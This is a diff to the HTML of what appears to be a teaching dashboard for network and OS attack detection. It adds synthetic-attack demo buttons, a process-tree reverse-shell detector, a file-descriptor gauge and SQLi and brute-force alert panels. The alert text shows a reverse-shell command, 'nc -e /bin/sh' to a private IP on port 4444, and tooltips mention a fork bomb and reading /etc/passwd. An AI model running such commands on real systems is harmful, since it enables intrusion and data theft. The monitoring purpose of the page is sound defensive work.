@@ -74,6 +74,7 @@
             <span class="badge badge-attack">ATTACK (RED)</span>
             <span id="mitm-badge-indicator" class="badge badge-mitm hidden">⚠️ MITM: REROUTED VIA HACKER</span>
             <span id="rst-badge-indicator" class="badge badge-rst hidden">⚡ TCP RST: SESSION BROKEN</span>
+            <span id="revshell-badge-indicator" class="badge badge-revshell hidden">🐚 REVERSE SHELL: SERVER &rarr; HACKER (:4444)</span>
             <span id="shield-badge-indicator" class="badge badge-shield">SHIELD: ACTIVE</span>
           </div>
         </div>
@@ -190,16 +191,21 @@
 
           <!-- Quick Test Traffic Generator (For Easy Live Demo) -->
           <div class="demo-tools-box">
-            <div class="box-title">SYNTHETIC LOGS · L2 / L4 / L7 DEMO</div>
+            <div class="box-title">SYNTHETIC LOGS · L2 / L4 / OS / L7 DEMO</div>
             <div class="demo-btn-group">
               <button id="btn-demo-ping" class="btn-micro btn-micro-green">Ping Check</button>
               <button id="btn-demo-user" class="btn-micro btn-micro-cyan">Normal Login</button>
               <button id="btn-demo-arp" class="btn-micro btn-micro-yellow" title="Giả mạo MAC & Bẻ đường truyền MitM">ARP Spoof (MitM)</button>
               <button id="btn-demo-syn" class="btn-micro btn-micro-purple" title="Bão gói tin TCP SYN làm vọt biểu đồ SYN_RECV">SYN Flood (L4)</button>
               <button id="btn-demo-rst" class="btn-micro btn-micro-red" title="Tiêm cờ TCP RST ngắt phiên Client-Server">TCP RST Inject</button>
-              <button id="btn-demo-sqli" class="btn-micro btn-micro-red">SQLi Attack</button>
-              <button id="btn-demo-dos" class="btn-micro btn-micro-orange">Heavy DoS</button>
               <button id="btn-demo-clean-arp" class="btn-micro btn-micro-green" title="Khôi phục bảng ARP sạch">Restore Clean ARP</button>
+              <button id="btn-demo-sqli" class="btn-micro btn-micro-red" title="Tấn công SQL Injection bypass đăng nhập">SQLi Attack (L7)</button>
+              <button id="btn-demo-bruteforce" class="btn-micro btn-micro-orange" title="Rà quét mật khẩu Brute-Force (Low-rate 1 req/s)">Brute-Force (L7)</button>
+              <button id="btn-demo-revshell" class="btn-micro btn-micro-red" title="OS Command Injection mở Reverse Shell (/bin/sh -> nc)">Reverse Shell (OS)</button>
+              <button id="btn-demo-fd-exhaust" class="btn-micro btn-micro-purple" title="Tấn công làm cạn kiệt File Descriptors (lsof / Fork Bomb)">FD Exhaust (lsof)</button>
+              <button id="btn-demo-traversal" class="btn-micro btn-micro-yellow" title="Khai thác Path Traversal đọc /etc/passwd">Path Traversal</button>
+              <button id="btn-demo-dos" class="btn-micro btn-micro-orange" title="Spam Heavy Report API làm treo CPU">Heavy DoS (L7)</button>
+              <button id="btn-demo-clean-os" class="btn-micro btn-micro-green" style="grid-column: span 2;" title="Ngắt tiến trình Reverse Shell & Khôi phục OS sạch">Kill Reverse Shell &amp; Reset OS</button>
             </div>
           </div>
         </div>
@@ -293,6 +299,145 @@
       </div>
     </section>
 
+    <!-- WEEK 4 ROW (TASK W4-T1): OS & APPLICATION L7 ATTACK VISUALIZATION (PSTREE, LSOF FD GAUGE, SQLI / BRUTE-FORCE ALERTS) -->
+    <section class="w4-os-l7-grid" aria-label="OS and L7 Security Monitors">
+      <!-- 1. CÂY TIẾN TRÌNH HĐH (PSTREE & REVERSE SHELL DETECTOR) -->
+      <div class="card w4-card" id="pstree-card">
+        <div class="card-header">
+          <div class="card-title">
+            <span class="neon-icon">🌳</span> OS PROCESS TREE <small>(<code>pstree</code> &amp; Reverse Shell)</small>
+          </div>
+          <div class="card-badges">
+            <span id="pstree-proc-count-badge" class="badge badge-shield">4 procs</span>
+            <span id="pstree-status-badge" class="badge badge-normal">OS: CLEAN</span>
+          </div>
+        </div>
+        <div class="w4-card-body">
+          <div id="revshell-alert-box" class="revshell-alert-box hidden">
+            🚨 <strong>REVERSE SHELL ACTIVE!</strong> Tiến trình con độc hại <code id="revshell-cmd-value">nc -e /bin/sh 172.20.0.66 4444</code> đang mở kết nối ngược từ Server về Hacker!
+          </div>
+          <div class="pstree-container" id="pstree-view" role="tree" aria-label="Cây tiến trình hệ điều hành">
+            <!-- Populated dynamically by app.js -->
+          </div>
+        </div>
+      </div>
+
+      <!-- 2. ĐỒNG HỒ ĐO FILE DESCRIPTORS (LSOF) & OS RESOURCE LIMITS -->
+      <div class="card w4-card" id="fd-gauge-card">
+        <div class="card-header">
+          <div class="card-title">
+            <span class="neon-icon">📟</span> FILE DESCRIPTORS <small>(<code>lsof</code> / <code>ulimit -n</code>)</small>
+          </div>
+          <div class="card-badges">
+            <span id="fd-status-badge" class="badge badge-normal">FD: NORMAL</span>
+          </div>
+        </div>
+        <div class="w4-card-body fd-gauge-body">
+          <div class="fd-gauge-layout">
+            <!-- SVG Radial Gauge Meter -->
+            <div class="fd-radial-wrapper">
+              <svg class="fd-radial-svg" viewBox="0 0 140 90" aria-label="Đồng hồ đo File Descriptors">
+                <!-- Track Arc -->
+                <path
+                  class="fd-arc-bg"
+                  d="M 15 78 A 55 55 0 0 1 125 78"
+                  fill="none"
+                  stroke-width="12"
+                  stroke-linecap="round"
+                />
+                <!-- Value Fill Arc -->
+                <path
+                  id="fd-arc-fill"
+                  class="fd-arc-fill"
+                  d="M 15 78 A 55 55 0 0 1 125 78"
+                  fill="none"
+                  stroke-width="12"
+                  stroke-linecap="round"
+                  stroke-dasharray="173"
+                  stroke-dashoffset="165"
+                />
+              </svg>
+              <div class="fd-gauge-center">
+                <div class="fd-gauge-pct" id="fd-gauge-percent">4%</div>
+                <div class="fd-gauge-sub"><span id="fd-open-count">42</span> / <span id="fd-max-limit">1024</span></div>
+              </div>
+            </div>
+
+            <!-- Right stats column -->
+            <div class="fd-stats-col">
+              <div class="fd-stat-row">
+                <span class="fd-stat-label">OPEN FDs (<code>lsof</code>):</span>
+                <strong id="fd-stat-open" class="fd-stat-val">42</strong>
+              </div>
+              <div class="fd-stat-row">
+                <span class="fd-stat-label">KERNEL <code>ulimit -n</code>:</span>
+                <strong id="fd-stat-max" class="fd-stat-val">1024</strong>
+              </div>
+              <div class="fd-stat-row">
+                <span class="fd-stat-label">PEAK OPEN FDs:</span>
+                <strong id="fd-stat-peak" class="fd-stat-val">42</strong>
+              </div>
+              <div class="fd-stat-row">
+                <span class="fd-stat-label">ACTIVE PROCS:</span>
+                <strong id="fd-stat-procs" class="fd-stat-val">4</strong>
+              </div>
+            </div>
+          </div>
+
+          <!-- Linear progress bar & sensitive files accessed via lsof/Path Traversal -->
+          <div class="fd-bar-section">
+            <div class="meter-bar fd-linear-bar">
+              <div id="fd-linear-fill" class="meter-fill fill-green" style="width: 4%;"></div>
+            </div>
+            <div class="fd-files-box" id="fd-suspicious-files">
+              <span class="fd-files-label">📂 <code>lsof</code> MONITOR:</span>
+              <code id="fd-files-list">Standard sockets &amp; SQLite WAL descriptors healthy</code>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- 3. BẢNG CẢNH BÁO SQLi / BRUTE-FORCE & TẤN CÔNG TẦNG 7 (L7 ALERTS) -->
+      <div class="card w4-card" id="l7-alerts-card">
+        <div class="card-header">
+          <div class="card-title">
+            <span class="neon-icon">🚨</span> L7 SECURITY ALERTS <small>(SQLi &amp; BRUTE-FORCE)</small>
+          </div>
+          <div class="card-badges">
+            <span id="l7-alert-total-badge" class="badge badge-normal">0 alerts</span>
+          </div>
+        </div>
+        <div class="w4-card-body l7-alerts-body">
+          <!-- Counter Summary Pills -->
+          <div class="l7-counters-bar">
+            <div class="l7-counter-pill pill-sqli">
+              <span class="l7-cnt-label">SQLi</span>
+              <strong id="cnt-sqli">0</strong>
+            </div>
+            <div class="l7-counter-pill pill-bf">
+              <span class="l7-cnt-label">BRUTE-FORCE</span>
+              <strong id="cnt-bruteforce">0</strong>
+            </div>
+            <div class="l7-counter-pill pill-cmd">
+              <span class="l7-cnt-label">CMD INJECT</span>
+              <strong id="cnt-cmd">0</strong>
+            </div>
+            <div class="l7-counter-pill pill-path">
+              <span class="l7-cnt-label">TRAVERSAL</span>
+              <strong id="cnt-traversal">0</strong>
+            </div>
+          </div>
+
+          <!-- Alerts Feed List -->
+          <div class="l7-alerts-list" id="l7-alerts-list" aria-live="polite">
+            <div class="sniffer-empty">
+              Chưa phát hiện cảnh báo Tầng Ứng dụng (L7). Khi có đòn tấn công <strong>SQL Injection</strong>, <strong>Brute-force Login</strong>, <strong>OS Command Injection</strong> hoặc <strong>Path Traversal</strong>, chi tiết payload sẽ hiển thị tại đây.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
     <!-- BOTTOM ROW: PACKET CAPTURE STREAM (TERMINAL LOG TABLE) -->
     <section class="card packet-stream-card">
       <div class="card-header">
@@ -313,8 +458,13 @@
               <option value="ARP_SPOOF">ARP SPOOF (MitM)</option>
               <option value="SYN_FLOOD">SYN FLOOD (L4)</option>
               <option value="RST_INJECTION">TCP RST INJECTION</option>
-              <option value="SQL_INJECTION">SQL INJECTION</option>
-              <option value="HEAVY_DOS">HEAVY DoS</option>
+              <option value="SQL_INJECTION">SQL INJECTION (L7)</option>
+              <option value="BRUTE_FORCE">BRUTE-FORCE LOGIN (L7)</option>
+              <option value="COMMAND_INJECTION">OS COMMAND INJECTION</option>
+              <option value="REVERSE_SHELL">REVERSE SHELL (OS)</option>
+              <option value="FD_EXHAUSTION">FD EXHAUSTION (lsof)</option>
+              <option value="PATH_TRAVERSAL">PATH TRAVERSAL (L7)</option>
+              <option value="HEAVY_DOS">HEAVY DoS (L7)</option>
               <option value="ATTACK_ONLY">ALL ATTACKS</option>
             </select>
           </div>
